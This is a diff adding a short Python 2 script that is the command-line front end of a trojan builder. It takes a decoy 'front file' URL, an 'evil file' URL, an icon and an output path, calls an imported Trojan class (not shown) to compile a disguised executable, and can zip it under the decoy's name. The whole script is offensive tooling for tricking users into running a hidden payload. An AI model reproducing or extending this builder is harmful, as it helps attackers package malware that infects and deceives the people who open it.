@@ -1,0 +1,27 @@
+#!/usr/bin/env python
+
+import optparse
+from Trojan import *
+import zipfile
+
+
+parser = optparse.OptionParser()
+parser.add_option('-f', '--front-file', dest='front_file_url', help='Direct URL to file that the user will see.')
+parser.add_option('-e', '--evil-file', dest='evil_file_url', help='Direct URL to the evil file file.')
+parser.add_option('-o', '--out-file', dest='out_file_path', help='Location to store the result.')
+parser.add_option('-i', '--icon', dest='icon_path', help='Trojan icon.')
+parser.add_option('-z', '--zip', dest='zip', help='Zip trojan?', action="store_true")
+
+(options, args) = parser.parse_args()
+
+print options
+
+
+trojan = Trojan(options.front_file_url, options.evil_file_url, options.icon_path)
+trojan.create()
+trojan.compilea(options.out_file_path)
+
+if options.zip: 
+	trojan_name = options.out_file_path.split("/")[-1]
+	zip_name = options.front_file_url.split("/")[-1].split(".")[-2]
+	zipfile.ZipFile(zip_name + ".zip", mode="w").write(trojan_name)
